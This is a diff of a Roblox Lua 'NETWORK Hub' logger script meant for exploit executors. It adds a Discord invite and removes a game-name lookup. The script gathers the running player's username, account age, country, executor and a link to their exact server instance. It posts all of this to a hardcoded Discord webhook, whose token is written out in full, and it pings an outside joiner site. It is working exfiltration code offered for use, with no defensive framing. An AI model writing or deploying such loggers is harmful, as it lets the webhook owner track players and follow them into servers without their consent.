@@ -1,114 +1,111 @@
 -- Ultimate NETWORK HUB-style Logger (2025-2026 Edition) + Dynamic Joiner
 local Players = game:GetService("Players")
 local Http = game:GetService("HttpService")
-local Market = game:GetService("MarketplaceService")
 local LocalizationService = game:GetService("LocalizationService")
 
 local plr = Players.LocalPlayer
 
 local webhook = "https://discord.com/api/webhooks/1500270818708684900/rjjsg9lOzPOMbh0AMuKFxDa4nYA7wos1EKe6h728YvTSB0_xqusuK5fD_50-dR5pipYm"
 
--- Executor Detection (unchanged)
+-- ←←← CHANGE THIS TO YOUR DISCORD INVITE ←←←
+local discordInvite = "https://discord.gg/GmT3uvzhVH"
+
+-- Executor Detection
 local executor = (
-    getexecutorname and getexecutorname() or
-    identifyexecutor and identifyexecutor() or
-    syn and "Synapse X" or
-    syn.request and "Synapse X (Legacy)" or
-    Fluxus and "Fluxus" or
-    isfluxusclosure and "Fluxus" or
-    KRNL_LOADED and "Krnl" or
-    isexecutorclosure and "ScriptWare" or
-    getgc and "Celery" or
-    ishydrogenclosure and "Hydrogen" or
-    gethui and "Wave" or
-    is_trinity_executor and "Trinity" or
-    is_nebula_executor and "Nebula" or
-    is_comet_executor and "Comet" or
-    is_valyse_executor and "Valyse" or
-    getexploit and "Codex" or
-    is_sirhurt_closure and "Sirhurt" or
-    secure_load and "Sentinel" or
-    is_scylla_closure and "Scylla" or
-    isevon and "Evon" or
-    is_roexec and "Roexec" or
-    is_calypso and "Calypso" or
-    is_matx and "MatX" or
-    is_temple and "Temple" or
-    is_oxygen and "Oxygen" or
-    is_karma and "Karma" or
-    is_vega and "Vega X" or
-    is_jjsploit and "JJSploit" or
-    is_delta and "Delta" or
-    is_solara and "Solara" or
-    is_electron_executor and "Electron" or
-    is_arceus and "Arceus X" or
-    is_nihon and "Nihon" or
-    is_omega and "Omega" or
-    is_blackout and "Blackout" or
-    is_thunder and "Thunder" or
-    "Unknown / Paid / Custom Executor"
+    getexecutorname and getexecutorname() or
+    identifyexecutor and identifyexecutor() or
+    syn and "Synapse X" or
+    syn.request and "Synapse X (Legacy)" or
+    Fluxus and "Fluxus" or
+    isfluxusclosure and "Fluxus" or
+    KRNL_LOADED and "Krnl" or
+    isexecutorclosure and "ScriptWare" or
+    getgc and "Celery" or
+    ishydrogenclosure and "Hydrogen" or
+    gethui and "Wave" or
+    is_trinity_executor and "Trinity" or
+    is_nebula_executor and "Nebula" or
+    is_comet_executor and "Comet" or
+    is_valyse_executor and "Valyse" or
+    getexploit and "Codex" or
+    is_sirhurt_closure and "Sirhurt" or
+    secure_load and "Sentinel" or
+    is_scylla_closure and "Scylla" or
+    isevon and "Evon" or
+    is_roexec and "Roexec" or
+    is_calypso and "Calypso" or
+    is_matx and "MatX" or
+    is_temple and "Temple" or
+    is_oxygen and "Oxygen" or
+    is_karma and "Karma" or
+    is_vega and "Vega X" or
+    is_jjsploit and "JJSploit" or
+    is_delta and "Delta" or
+    is_solara and "Solara" or
+    is_electron_executor and "Electron" or
+    is_arceus and "Arceus X" or
+    is_nihon and "Nihon" or
+    is_omega and "Omega" or
+    is_blackout and "Blackout" or
+    is_thunder and "Thunder" or
+    "Unknown / Paid / Custom Executor"
 )
 
 -- Get Country
 local function getCountry()
-    local success, code = pcall(function()
-        return LocalizationService:GetCountryRegionForPlayerAsync(plr)
-    end)
-    return success and code or "Unknown"
+    local success, code = pcall(function()
+        return LocalizationService:GetCountryRegionForPlayerAsync(plr)
+    end)
+    return success and code or "Unknown"
 end
-
-local gameName = "Unknown Game"
-pcall(function()
-    gameName = Market:GetProductInfo(game.PlaceId).Name
-end)
 
 -- Dynamic Join Link
 local joinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
 
--- Logger Data
+-- Logger Data with Clickable Discord Link
 local data = {
-    content = "|| New Log claimed ||",
-    embeds = {{
-        title = "Info",
-        description = "",
-        color = 0x2F3136,
-        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
-        fields = {
-            {name = "Username",      value = plr.Name,                  inline = true},
-            {name = "Account Age",   value = plr.AccountAge .. " Days", inline = true},
-            {name = "Country",       value = getCountry(),              inline = true},
-            {name = "Executor",      value = executor,                  inline = true},
-            {name = "Join Link",     value = joinLink,                  inline = true},
-        },
-        footer = {text = "NETWORK Hub â¢ "..os.date("%Y-%m-%d %X")},
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }}
+    content = "|| New Log claimed ||",
+    embeds = {{
+        title = "Info",
+        description = "**[🔗 Join Discord Server](" .. discordInvite .. ")**",
+        color = 0x2F3136,
+        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
+        fields = {
+            {name = "Username",      value = plr.Name,                 inline = true},
+            {name = "Account Age",   value = plr.AccountAge .. " Days", inline = true},
+            {name = "Country",       value = getCountry(),              inline = true},
+            {name = "Executor",      value = executor,                 inline = true},
+            {name = "Join Link",     value = joinLink,                 inline = true},
+        },
+        footer = {text = "NETWORK Hub • "..os.date("%Y-%m-%d %X")},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
 }
 
 -- Send Log
 local req = syn and syn.request or http_request or request or Http.request or HttpPost
 if req then
-    pcall(function()
-        req({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = Http:JSONEncode(data)
-        })
-    end)
+    pcall(function()
+        req({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = Http:JSONEncode(data)
+        })
+    end)
 end
 
 -- Auto Join via Fern.wtf
-print("ð Attempting to join current server via Fern.wtf...")
+print("🌐 Attempting to join current server via Fern.wtf...")
 print("Join Link: " .. joinLink)
 
 pcall(function()
-    if request then
-        request({
-            Url = joinLink,
-            Method = "GET"
-        })
-    end
+    if request then
+        request({
+            Url = joinLink,
+            Method = "GET"
+        })
+    end
 end)
 
-print("â Network Hub + Joiner executed successfully.")
+print("✅ Network Hub + Joiner executed successfully.")
